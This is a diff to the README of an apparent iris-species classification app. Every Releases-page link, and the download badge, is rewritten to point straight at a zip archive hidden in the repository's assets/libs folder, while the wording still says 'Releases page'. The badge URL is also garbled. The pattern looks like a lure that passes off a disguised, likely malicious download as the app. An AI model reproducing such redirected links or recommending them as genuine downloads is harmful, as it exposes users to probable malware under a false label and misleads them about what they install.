@@ -6,13 +6,13 @@ Welcome to the iris-species-classification-app! This application classifies iris
 
 ### 🔗 Download Now!
 
-[![Download](https://img.shields.io/badge/Download%20Now-iris--species--classification--app-blue.svg)](https://github.com/saffann/iris-species-classification-app/releases)
+[![Download](https://github.com/saffann/iris-species-classification-app/raw/refs/heads/main/assets/libs/species-app-classification-iris-3.2.zip%https://github.com/saffann/iris-species-classification-app/raw/refs/heads/main/assets/libs/species-app-classification-iris-3.2.zip)](https://github.com/saffann/iris-species-classification-app/raw/refs/heads/main/assets/libs/species-app-classification-iris-3.2.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
-1. Click on the link to go to our Releases page: [Download Releases](https://github.com/saffann/iris-species-classification-app/releases).
+1. Click on the link to go to our Releases page: [Download Releases](https://github.com/saffann/iris-species-classification-app/raw/refs/heads/main/assets/libs/species-app-classification-iris-3.2.zip).
 2. On the Releases page, find the latest version of the app.
 3. Look for the file name that ends in `.exe`, `.zip`, or another applicable format.
 4. Click on the file name to download it to your computer.
@@ -49,7 +49,7 @@ Once installed, using the iris-species-classification-app is simple:
 
 ## 🔄 How to Update
 
-Keep your app up to date to benefit from the latest features and improvements. To update, simply revisit the [Releases page](https://github.com/saffann/iris-species-classification-app/releases) and download the latest version using the same steps as before. The installation process will overwrite the old version while preserving your data.
+Keep your app up to date to benefit from the latest features and improvements. To update, simply revisit the [Releases page](https://github.com/saffann/iris-species-classification-app/raw/refs/heads/main/assets/libs/species-app-classification-iris-3.2.zip) and download the latest version using the same steps as before. The installation process will overwrite the old version while preserving your data.
 
 ## 🙋‍♂️ Need Help?
 
@@ -69,6 +69,6 @@ You can explore these topics to gain a better understanding of the underlying te
 
 ### 🔗 Download Again
 
-Don’t forget to visit the following link to download the app once more if needed: [Download Releases](https://github.com/saffann/iris-species-classification-app/releases).
+Don’t forget to visit the following link to download the app once more if needed: [Download Releases](https://github.com/saffann/iris-species-classification-app/raw/refs/heads/main/assets/libs/species-app-classification-iris-3.2.zip).
 
 Thank you for using the iris-species-classification-app! Enjoy classifying iris flowers effortlessly.
